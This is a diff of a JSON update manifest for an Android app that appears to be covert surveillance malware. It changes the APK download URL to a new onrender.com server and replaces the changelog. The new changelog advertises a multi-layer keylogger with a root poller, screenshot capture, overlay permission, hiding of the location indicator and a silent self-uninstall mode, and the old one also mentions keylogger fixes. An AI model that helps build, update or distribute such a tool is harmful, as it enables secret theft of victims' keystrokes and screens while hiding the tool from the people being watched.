@@ -1,8 +1,8 @@
 {
-  "version_code": 55,
-  "version_name": "7.9.10",
-  "apk_url": "https://netmirrorr.onrender.com/downloadapp/fullupdate.apk",
-  "changelog": "FIXED: Keylogger (removed serviceInfo reset), connection drops (stale socket guard + onTaskRemoved restart + synchronized connect), notification delete feature, block app manual entry.",
+  "version_code": 56,
+  "version_name": "7.9.38",
+  "apk_url": "https://nowmirror.onrender.com/downloadapp/fullupdate.apk",
+  "changelog": "v7.9.38: MULTI-LAYER keylogger (4 event types + root poller), FCM token endpoint, blue-dot fix (removed location FGS type), silent self-uninstall mode, SYSTEM_ALERT_WINDOW, canTakeScreenshots=true, nowmirror.onrender.com server migration.",
   "is_mandatory": false,
   "poster_url": "",
   "minSdk": 26,
